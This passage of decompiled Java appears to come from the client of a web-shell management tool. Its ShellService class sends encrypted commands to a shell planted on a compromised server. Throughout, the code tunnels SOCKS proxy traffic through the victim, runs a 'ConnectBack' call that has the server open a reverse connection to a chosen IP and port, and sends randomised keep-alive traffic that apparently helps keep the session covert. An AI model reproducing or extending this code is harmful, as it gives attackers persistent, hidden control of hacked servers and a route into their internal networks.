                return null;
            }
            throw e;
        }
        final Map<String, String> resHeader = (Map<String, String>) result.get("header");
        if (resHeader.get("status").equals("200")) {
            resData = (byte[]) result.get("data");
            if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
                resData = null;
            }
            else {
                if (resHeader.containsKey("server") && resHeader.get("server").indexOf("Apache-Coyote/1.1") > 0) {
                    resData = Arrays.copyOfRange(resData, 0, resData.length - 1);
                }
                if (resData == null) {
                    resData = new byte[0];
                }
            }
        }
        else {
            resData = null;
        }
        return resData;
    }
    
    public boolean writeProxyData(final byte[] proxyData) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("cmd", "FORWARD");
        params.put("targetIP", "");
        params.put("targetPort", "");
        params.put("extraData", Base64.encode(proxyData));
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType);
        final Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final Map<String, String> resHeader = (Map<String, String>) result.get("header");
        byte[] resData = (byte[]) result.get("data");
        if (!resHeader.get("status").equals("200")) {
            return false;
        }
        if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
            resData = Arrays.copyOfRange(resData, 4, resData.length);
            return false;
        }
        return true;
    }
    
    public boolean closeProxy() throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("cmd", "DISCONNECT");
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType);
        final Map<String, String> resHeader = (Map<String, String>) Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex).get("header");
        return resHeader.get("status").equals("200");
    }
    
    public boolean openProxy(final String destHost, final String destPort) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("cmd", "CONNECT");
        params.put("targetIP", destHost);
        params.put("targetPort", destPort);
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType);
        final Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final Map<String, String> resHeader = (Map<String, String>) result.get("header");
        byte[] resData = (byte[]) result.get("data");
        if (!resHeader.get("status").equals("200")) {
            return false;
        }
        if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
            resData = Arrays.copyOfRange(resData, 4, resData.length);
            return false;
        }
        return true;
    }
    
    public JSONObject echo(final String content) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("content", content);
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "Echo", params, this.currentType);
        final Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final Map<String, String> responseHeader = (Map<String, String>) resultObj.get("header");
        for (final String headerName : responseHeader.keySet()) {
            if (headerName == null) {
                continue;
            }
            if (!headerName.equalsIgnoreCase("Set-Cookie")) {
                continue;
            }
            final String cookieValue = responseHeader.get(headerName);
            this.mergeCookie(this.currentHeaders, cookieValue);
        }
        final byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
        final JSONObject result = new JSONObject(resultTxt);
        for (final String key : result.keySet()) {
            result.put(key, (Object)new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    public String getBasicInfo(final String whatever) throws Exception {
        String result = "";
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("whatever", whatever);
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "BasicInfo", params, this.currentType);
        final Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final byte[] resData = (byte[]) resultObj.get("data");
        try {
            result = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        }
        catch (Exception e) {
            e.printStackTrace();
            throw new Exception("\u8bf7\u6c42\u5931\u8d25:" + new String(resData, "UTF-8"));
        }
        return result;
    }
    
    private void showErrorMessage(final String title, final String msg) {
        final Alert alert = new Alert(Alert.AlertType.ERROR);
        final Window window = alert.getDialogPane().getScene().getWindow();
        window.setOnCloseRequest(event -> window.hide());
        alert.setTitle(title);
        alert.setHeaderText("");
        alert.setContentText(msg);
        alert.show();
    }
    
    public void keepAlive() throws Exception {
        while (true) {
            try {
                while (true) {
                    Thread.sleep((new Random().nextInt(5) + 5) * 60 * 1000);
                    final int randomStringLength = new SecureRandom().nextInt(3000);
                    this.echo(Utils.getRandomString(randomStringLength));
                    this.getBasicInfo(Utils.getRandomString(randomStringLength));
                }
            }
            catch (Exception e) {
                if (e instanceof InterruptedException) {
                    return;
                }
                Platform.runLater(() -> this.showErrorMessage("\u63d0\u793a", "\u7531\u4e8e\u60a8\u957f\u65f6\u95f4\u672a\u64cd\u4f5c\uff0c\u5f53\u524d\u8fde\u63a5\u4f1a\u8bdd\u5df2\u8d85\u65f6\uff0c\u8bf7\u91cd\u65b0\u6253\u5f00\u8be5\u7f51\u7ad9\u3002"));
                e.printStackTrace();
                continue;
            }
        }
    }
    
    public JSONObject connectBack(final String type, final String ip, final String port) throws Exception {
        final Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("type", type);
        params.put("ip", ip);
        params.put("port", port);
        final byte[] data = Utils.getData(this.currentKey, this.encryptType, "ConnectBack", params, this.currentType);
        final Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        final byte[] resData = (byte[]) resultObj.get("data");
        final String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        final JSONObject result = new JSONObject(resultTxt);
        for (final String key : result.keySet()) {
            result.put(key, (Object)new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
    
    static {
        ShellService.BUFFSIZE = 46080;
    }
}
